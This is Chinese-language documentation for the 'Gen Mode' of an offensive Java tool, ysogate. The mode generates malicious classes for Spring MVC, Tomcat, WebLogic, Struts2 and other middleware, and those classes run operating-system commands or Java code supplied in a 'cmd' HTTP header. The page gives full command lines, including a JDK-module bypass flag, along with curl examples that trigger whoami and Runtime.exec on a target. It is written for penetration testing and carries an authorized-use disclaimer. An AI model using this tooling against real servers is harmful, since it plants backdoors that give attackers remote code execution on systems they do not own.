# Gen Mode

Gen Mode用于生成恶意类，支持多种中间件/框架的命令执行和代码执行模板。生成的类可以用于安全测试和漏洞研究。

## 基本用法

```bash
java -jar ysogate-[version]-all.jar -m gen [OPTIONS]
```

## 命令行选项

```bash
[root]#~  Gen Mode Options:
 -bypass                   ByPass JDK Module
 -f,--format <arg>         Output format
 -h,--help                 Show help message
 -m,--mode <arg>           Operation mode: 'payload' or 'jndi' or 'gen'
 -name,--classname <arg>   Evil Class Name
 -s,--sink <arg>           Evil sink template
 -t,--type <arg>           Middleware type
```

## 使用示例

### 基本用法

生成Spring MVC的命令执行回显：

```bash
java -jar ysogate-[version]-all.jar -m gen -t springmvc -s CmdExec -name org.springframework.expression.Evil -bypass
```

指定输出格式：

```bash
java -jar ysogate-[version]-all.jar -m gen -t springmvc -s CmdExec -name org.springframework.expression.Evil -f base64
```

## 支持的中间件/框架及执行模式

| 中间件/框架 | 执行模式          |
| ----------- | ----------------- |
| springmvc   | CmdExec，CodeExec |
| tomcat      | CmdExec，CodeExec |
| resin       | CmdExec，CodeExec |
| weblogic    | CmdExec，CodeExec |
| jetty       | CmdExec，CodeExec |
| websphere   | CmdExec，CodeExec |
| undertow    | CmdExec，CodeExec |
| glassfish   | CmdExec，CodeExec |
| struts2     | CmdExec，CodeExec |

## 模板说明

### CmdExec (命令执行)

生成的类会在请求中查找特定的Header（默认为"cmd"），执行其中的命令并返回结果。

使用示例：
```bash
# 生成类
java -jar ysogate-[version]-all.jar -m gen -t springmvc -s CmdExec -name org.springframework.expression.Evil -bypass

# 在请求中添加Header执行命令
curl -H "cmd: whoami" http://target/
```

### CodeExec (代码执行)

生成的类会在请求中查找特定的Header（默认为"cmd"），将其中的内容作为Java代码执行。

使用示例：
```bash
# 生成类
java -jar ysogate-[version]-all.jar -m gen -t springmvc -s CodeExec -name org.springframework.expression.Evil -bypass

# 在请求中添加Header执行代码
curl -H "cmd: java.lang.Runtime.getRuntime().exec(\"whoami\")" http://target/
```

## 参数说明

- `-t, --type`: 指定目标中间件/框架类型
- `-s, --sink`: 指定执行模式（CmdExec或CodeExec）
- `-name, --classname`: 指定生成的恶意类名
- `-bypass`: 绕过JDK模块系统限制
- `-f, --format`: 指定输出格式（默认为base64）
- `-h, --help`: 显示帮助信息

## 安全使用说明

⚠️ **重要提醒**：本工具仅面向**合法授权**的安全测试使用，请勿用于非法目的。

使用本工具进行安全测试时，请确保：
1. 已获得目标系统的明确授权
2. 仅在授权范围内进行测试
3. 遵守相关法律法规